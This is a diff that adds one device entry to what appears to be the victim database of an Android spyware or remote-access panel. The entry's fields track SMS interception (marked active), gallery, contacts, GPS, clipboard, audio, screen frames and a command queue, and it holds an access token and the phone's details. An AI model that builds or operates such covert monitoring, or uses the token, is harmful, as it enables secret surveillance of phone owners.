@@ -4347,5 +4347,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "aimlock_2396f2e9",
+    "deviceName": "HP-DESTA-BD10",
+    "ownerUsername": "abiv12",
+    "token": "f3e5a6a1df762ce1e4d0869ebc7772e5",
+    "lastSeen": 1775649540352,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-08T11:59:00.352Z",
+    "deviceInfo": {
+      "model": "vivo vivo 1901",
+      "androidVersion": "Android 11",
+      "battery": 73,
+      "network": "WiFi: ZiF.Net",
+      "sim1": "Panggilan darurat saja",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
